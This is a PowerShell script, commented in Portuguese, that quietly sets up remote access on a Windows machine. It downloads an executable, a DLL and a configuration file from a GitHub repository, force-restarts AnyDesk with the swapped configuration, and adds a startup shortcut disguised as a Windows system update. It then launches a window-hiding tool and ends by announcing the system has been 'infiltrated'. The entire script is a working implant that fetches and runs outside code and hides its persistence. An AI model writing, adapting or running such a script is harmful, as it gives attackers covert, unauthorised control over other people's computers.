# 1. Definições
$myFolder = "$env:AppData\Questions"
$anydeskDir = "$env:AppData\AnyDesk"
$startupPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Criar a pasta de trabalho se não existir
if (!(Test-Path $myFolder)) { New-Item -ItemType Directory -Path $myFolder | Out-Null }

# 3. Baixar os ficheiros necessários (Tudo para a tua pasta)
$urls = @{
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBTray.exe" = "$myFolder\RBTray.exe"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBHook.dll" = "$myFolder\RBHook.dll"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/system.conf" = "$myFolder\system.conf"
}

Write-Host "A baixar os recursos..." -ForegroundColor Cyan
foreach ($url in $urls.Keys) {
    Invoke-WebRequest -Uri $url -OutFile $urls[$url]
}

# 4. Configurar o AnyDesk (Versão User-Mode)
if (Test-Path $anydeskDir) {
    Write-Host "A configurar o AnyDesk..." -ForegroundColor Cyan
    Stop-Process -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
    Copy-Item -Path "$myFolder\system.conf" -Destination "$anydeskDir\system.conf" -Force
    Start-Process "$anydeskDir\AnyDesk.exe" -ErrorAction SilentlyContinue
}

# 5. Criar o atalho no Startup (Invisível/Disfarçado)
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystemUpdate.lnk")
$shortcut.TargetPath = "$myFolder\RBTray.exe"
$shortcut.WorkingDirectory = $myFolder
$shortcut.Description = "Windows System Management Tool"
$shortcut.Save()

# 6. Executar o RBTray agora
Start-Process "$myFolder\RBTray.exe"

Write-Host "Deploy completo, Questions! Sistema infiltrado com sucesso." -ForegroundColor Green
